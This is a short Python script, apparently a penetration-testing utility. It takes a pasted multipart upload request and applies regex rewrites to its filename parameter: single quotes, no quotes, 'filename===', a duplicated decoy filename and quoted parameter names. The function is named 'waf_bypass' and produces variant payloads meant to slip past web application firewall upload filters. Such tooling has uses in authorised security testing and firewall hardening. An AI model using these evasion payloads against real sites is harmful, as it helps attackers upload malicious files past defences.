import re

waf_rule_list = [
    ['单引号filename',r'filename="(.*)"',"filename='\g<1>'"],
    ['单引号filename2',r'filename="(.*)"',"filename='\g<1>"],
    ['无包裹filename',r'filename="(.*)"','filename=\g<1>'],
    ['filename===',r'filename=','filename==='],
    ['双name',r'filename=','filename="1.jpg";filename='],
    ['单引号name',r'filename=',"'filename'="],
    ['双引号name',r'filename=','"filename"=']
]
payload_list = []
def waf_bypass(paste):
    for rule in waf_rule_list:
        payload = re.sub(rule[1],rule[2],paste,1)
        payload_list.append([rule[0],payload])
    return payload_list
